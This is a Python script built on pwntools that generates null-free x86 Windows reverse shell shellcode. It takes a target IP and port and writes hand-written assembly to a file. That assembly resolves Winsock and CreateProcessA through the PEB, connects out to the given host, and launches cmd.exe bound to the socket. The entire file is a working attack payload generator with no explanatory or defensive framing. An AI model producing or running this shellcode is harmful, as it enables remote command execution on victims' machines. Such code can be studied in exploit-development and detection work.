#!/usr/bin/env python3
from pwn import *
import re
import argparse
from math import ceil
parser = argparse.ArgumentParser(description='Generate x86 windows reverse shell shellcode')
parser.add_argument('-i', '--ip', type=str, required=True, help='IP address of client')
parser.add_argument('-p', '--port', type=int, required=True, help='Port of client')
parser.add_argument('-o', '--output', type=argparse.FileType('wb'), required=False, help='Output shellcode file')

args = parser.parse_args()
ip = args.ip
port = args.port
ip = '0x'+''.join([hex(int(b))[2:] for b in ip.split('.')][::-1])

code = f'''
push ebp
mov ebp, esp
sub esp, 0x60

mov eax, [fs:0x30]; PEB
mov eax, [eax+0xc]; LDR
mov eax, [eax+0x14] ;InMemoryOrderList
mov eax, [eax]
mov eax, [eax]
mov eax, [eax+0x10]; kernel32.dll base address
mov [ebp-4], eax; var4 = kernel32 base addr
mov eax, [eax+0x3c]
add eax, [ebp-4]; e_lfanew
mov eax, [eax+0x78]
add eax, [ebp-4]; data dir
mov [ebp-8], eax; var8 = data dir
mov eax, [eax+0x20]
add eax, [ebp-4]
mov [ebp-12], eax; var12 = name table
mov eax, [ebp-8]
mov eax, [eax+0x24]
add eax, [ebp-4]
mov [ebp-16], eax; var16 = ordinal table
mov eax, [ebp-8]
mov eax, [eax+0x1c]
add eax, [ebp-4]
mov [ebp-8], eax; var8 = addr table

/* push GetProcAddress*/
push 0x1010101
xor dword ptr [esp], 0x1017272
push 0x65726464
push 0x41636f72
push 0x50746547

mov [ebp-20], esp; var20 = GetProcAddress

xor eax, eax
xor ecx, ecx
xor ebx, ebx
.lp1:
    mov edi, [ebp-20]
    mov esi, [ebp-12]
    mov esi, [esi+4*ebx]
    add esi, [ebp-4]
        .lp2:
            lodsb
            test eax, eax
            jz .found
            scasb
            je .eq
            inc ebx
            jmp .lp1
            .eq:
            jmp .lp2


.found:
mov eax, ebx
mov [ebp-20], eax; ordinal
add esp, 16
mov eax, [ebp-16]
xor ecx, ecx
mov cx, [eax+2*ebx]
mov eax, [ebp-8]
mov eax, [eax+4*ecx]
add eax, [ebp-4]
mov [ebp-8], eax; var8 = GetProcAddr

;/* push b'LoadLibraryA\x00' */
push 1
dec byte ptr [esp]
push 0x41797261
push 0x7262694c
push 0x64616f4c

push esp
mov eax, [ebp-4]
push eax
mov eax,[ebp-8]
call eax
mov [ebp-12], eax; var12 = LoadLibraryA
add esp, 16

    /* push 'Ws2_32.dll\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1016d6d
    push 0x642e3233
    push 0x5f327357

push esp
mov eax, [ebp-12]
call eax
mov [ebp-16], eax; var16=Ws2.dll
add esp, 12

; WSADATA 400 bytes
xor ecx, ecx
xor eax, eax
.wsadata_loop:
push eax
add ecx, 4
cmp ecx, 400
jl .wsadata_loop
mov [ebp-20], esp; var20 = WSADATA

    /* push 'WSAStartup\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1017174
    push 0x74726174
    push 0x53415357

push esp
mov eax, [ebp-16]
push eax
mov eax, [ebp-8]
call eax
add esp, 12
mov ebx, [ebp-20]
push ebx
pushd 0x0202
call eax

    /* push 'WSASocketA\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1014075
    push 0x656b636f
    push 0x53415357

push esp
mov eax, [ebp-16]
push eax
mov eax, [ebp-8]
call eax
mov [ebp-24], eax; var 24 = WSASocket

xor eax, eax
push eax
push eax
push eax
pushd 6
pushd 1
pushd 2
mov eax, [ebp-24]
call eax
mov [ebp-28], eax; var28 = s

xor eax, eax
push eax
push eax
push eax
push eax
mov [ebp-32], esp; var32 = sockaddr

movw [esp], 2
movw [esp+2], 0x{p16(port).hex()}
mov dword ptr [esp+4], {ip}

    /* push 'connect\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1756264
    push 0x6e6e6f63

push esp
mov eax, [ebp-16]
push eax
mov eax, [ebp-8]
call eax

pushd 16
mov ebx, [ebp-32]
push ebx
mov ebx, [ebp-28]
push ebx
call eax

xor eax, eax
push eax
push eax
push eax
push eax
mov [ebp-36], esp; var36 = pi
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov [ebp-40], esp; var40 = si

mov dword ptr [esp], 0x44
mov dword ptr [esp+11*4], 0x00000100
mov eax, [ebp-28]
mov dword ptr [esp+14*4], eax
mov dword ptr [esp+15*4], eax
mov dword ptr [esp+16*4], eax

    /* push 'CreateProcessA\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1014072
    push 0x7365636f
    push 0x72506574
    push 0x61657243
push esp
mov eax, [ebp-4]
push eax
mov eax, [ebp-8]
call eax
mov ebx, eax
add esp, 16


    /* push 'cmd.exe\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1647964
    push 0x2e646d63
mov [ebp-44], esp; var44 = cmd.exe

mov eax, [ebp-36]
push eax
mov eax, [ebp-40]
push eax
xor eax, eax
push eax
push eax
push eax
inc eax
push eax
xor eax, eax
push eax
push eax
mov eax, [ebp-44]
push eax
xor eax, eax
push eax
call ebx


add esp, 0x70
add esp, 0x60

pop ebp
ret
'''
code = re.sub(';.*\n', '\n', code)

context.update(arch='i686', bits=32)
sc = asm(code)
if args.output == None:
	print(sc)
else:
	args.output.write(sc)